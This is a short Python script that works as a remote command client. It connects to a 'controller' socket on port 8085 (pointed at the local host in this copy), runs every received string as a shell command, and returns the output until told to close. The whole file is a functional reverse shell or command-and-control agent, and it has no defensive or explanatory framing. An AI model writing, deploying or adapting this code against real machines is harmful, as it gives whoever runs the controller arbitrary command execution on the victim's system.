import socket
import subprocess

def client_program():
    host = socket.gethostname()  # as both code is running on same pc
    port = 8085  # socket server port number

    client_socket = socket.socket()  # instantiate
    client_socket.connect((host, port))  # connect to the server

    data = ""


    while data.lower().strip() != 'close':

        data = client_socket.recv(1024).decode()  # receive instructions
        if data.lower().strip() != 'close':

            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            cmd_bytes = cmd.stdout.read() + cmd.stderr.read()
            cmd_str = str(cmd_bytes)
            client_socket.send(cmd_bytes)
            cmd_str = cmd_str.replace("\\r\\n", "\n")
            print('Received From Controler : ' + data)  # show in terminal
            print('Send To Controler : ' + cmd_str)

    client_socket.close()  # close the connection

if __name__ == '__main__':
    client_program()
